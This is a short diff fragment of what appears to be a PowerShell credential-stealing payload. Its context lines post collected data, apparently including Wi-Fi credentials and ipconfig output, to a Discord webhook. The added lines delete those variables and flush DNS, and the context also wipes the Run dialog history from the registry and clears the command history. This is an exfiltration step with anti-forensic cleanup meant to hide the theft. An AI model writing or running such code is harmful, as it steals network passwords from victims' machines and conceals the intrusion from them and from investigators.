@@ -12,6 +12,10 @@ $Body = @{
 	
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 
+Remove-Variable wifiCreds,ipconfig,Body,discord
+
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+ipconfig /flushdns
 
 Clear-History
